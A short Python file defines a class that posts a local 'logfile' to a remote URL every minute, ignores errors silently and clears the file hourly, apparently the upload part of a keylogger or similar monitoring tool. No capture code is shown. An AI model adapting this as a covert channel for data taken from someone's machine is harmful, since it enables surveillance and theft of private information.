import requests as r
import threading
import schedule

class Sender():
    def __init__(self, remote = "http://127.0.0.1", logfile = "./logfile"):
        self.remote = remote
        self.logfile = logfile

    def run_scheduler(self):
        # schedule.every().hour.do(self.collect)
        schedule.every().minute.do(self.collect)
        schedule.every().hour.do(self.clear_logs)

    def collect(self):
        with open(self.logfile, 'rb') as f:
            try:
                resp = r.post(self.remote, files={'logfile.txt': f})
            except:
                pass
                
    def clear_logs(self):
        open(self.logfile, "w").close()

    def start(self):
        self.run_scheduler()
        t = threading.Thread(target=self.run_tasks)
        t.start()

    def run_tasks(self):
        while True:
            schedule.run_pending()
        

